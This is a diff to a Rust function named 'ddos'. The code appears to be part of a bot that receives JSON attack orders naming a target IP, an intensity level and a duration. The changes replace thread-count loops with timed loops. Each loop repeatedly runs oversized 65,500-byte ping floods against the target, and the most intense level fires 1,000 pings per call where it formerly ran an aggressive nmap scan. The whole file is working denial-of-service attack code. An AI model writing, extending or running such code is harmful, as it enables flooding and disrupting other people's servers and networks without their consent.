@@ -1,5 +1,6 @@
 use std::process::Command;
 use std::thread;
+use std::time::{Duration, Instant};
 use serde::{Deserialize, Serialize};
 use crate::function_utils::subprocess_run;
 use crate::function_utils;
@@ -12,7 +13,7 @@ struct DataReceived {
     attack: String,
     cible: String,
     level:String,
-    threads:u32
+    time:u64
 }
 fn receive_data_json_to_str(data: String) -> DataReceived {
     let p = serde_json::from_str::<DataReceived>(&data).expect("Erreur JSON");
@@ -77,39 +78,58 @@ pub(crate) fn ddos(ordre:String){
 
     let data = receive_data_json_to_str(ordre);
     let ip = check_ip(data.cible.clone());
+    let target_time = Duration::from_secs(data.time);
+    let start_time = Instant::now();
+
     if ip == false {
         println!("L'ip n'est pas correcte");
         return;
     }else if ip == true {
 
-        println!("Lancement de l'attaque {} niveau {} sur {} avec {} threads.", data.attack, data.level, data.cible, data.threads);
+        println!("Lancement de l'attaque {} niveau {} sur {} pendant {} secondes.", data.attack, data.level, data.cible, data.time);
 
         if data.level == "1" {
             //MODE : discret
-            for i in 0..data.threads {
-                let cmd = format!("ping {} -n 10 -l 65500", data.cible.clone());
+            loop {
+                if Instant::now() - start_time >= target_time {
+                    break;
+                }
+                let cmd = format!("ping {} -n 1 -l 65500", data.cible.clone());
                 let sortie = subprocess_run(&*cmd);
-                thread::sleep(std::time::Duration::from_millis(20000));
-            }
-            println!("Fin de l'attaque.")
 
+                // pause pour éviter d'envoyer des pings trop rapidement
+                std::thread::sleep(Duration::from_secs(1));
+            }
+
+            println!("Fin de l'attaque");
         }else if data.level == "2" {
             //MODE : normal
-            for i in 0..data.threads {
+            loop {
+                if Instant::now() - start_time >= target_time {
+                    break;
+                }
                 let cmd = format!("ping {} -l 65500", data.cible.clone());
                 let sortie = subprocess_run(&*cmd);
+
+                // pause pour éviter d'envoyer des pings trop rapidement
+                std::thread::sleep(Duration::from_secs(1));
             }
-            println!("Fin de l'attaque.")
+
+            println!("Fin de l'attaque");
         }else if data.level == "3" {
             //MODE : avancé
-            for i in 0..data.threads {
-                let output = Command::new("nmap")
-                    .arg("-T5")
-                    .arg(data.cible.clone())
-                    .output()
-                    .expect("failed to execute process");
+            loop {
+                if Instant::now() - start_time >= target_time {
+                    break;
+                }
+                let cmd = format!("ping {} -n 1000 -l 65500", data.cible.clone());
+                let sortie = subprocess_run(&*cmd);
+
+                // pause pour éviter d'envoyer des pings trop rapidement
+                std::thread::sleep(Duration::from_secs(1));
             }
-            println!("Fin de l'attaque.")
+
+            println!("Fin de l'attaque");
         }
     }else {
         println!("Erreur");
